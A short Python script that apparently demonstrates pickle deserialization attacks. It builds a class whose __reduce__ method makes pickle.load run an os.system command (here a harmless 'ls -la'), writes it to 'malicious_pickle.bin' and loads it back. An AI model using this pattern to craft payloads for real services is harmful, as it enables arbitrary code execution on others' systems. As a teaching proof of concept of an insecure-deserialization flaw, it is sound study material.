import pickle, os
from user import User

class SerializedPickle(object):
    def __reduce__(self):
        return(os.system,("ls -la",))

def execute():
    with (open('malicious_pickle.bin','wb')) as f:
        pickle.dump(SerializedPickle(), f)

    with (open('malicious_pickle.bin','rb')) as f:
        pickle.load(f)

def main():
    print('command example')
    execute()

if __name__=="__main__":
    main()